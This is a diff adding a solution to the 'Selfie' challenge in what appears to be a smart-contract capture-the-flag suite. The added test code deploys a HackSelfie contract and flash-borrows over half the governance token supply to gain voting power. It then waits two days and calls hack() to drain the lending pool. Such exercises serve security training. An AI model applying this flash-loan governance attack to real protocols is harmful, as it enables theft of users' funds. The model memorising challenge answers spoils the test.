@@ -39,6 +39,21 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // governanceToken is the same token as SelfiePool's loan token
+        // in order to get enough votes, we need tokens more than half of totalSupply
+        // which is TOKEN_INITIAL_SUPPLY / 2 + 1
+
+        const hackSelfie = await (await ethers.getContractFactory("HackSelfie", player)).deploy(
+            pool.address,
+            governance.address,
+            token.address,
+            player.address
+        );
+        await hackSelfie.makeLoan( TOKEN_INITIAL_SUPPLY / 2n + 1n );
+        // wait for 2 days
+        await time.increase( 2n * 86400n ); // 2 days
+        await hackSelfie.hack();
     });
 
     after(async function () {
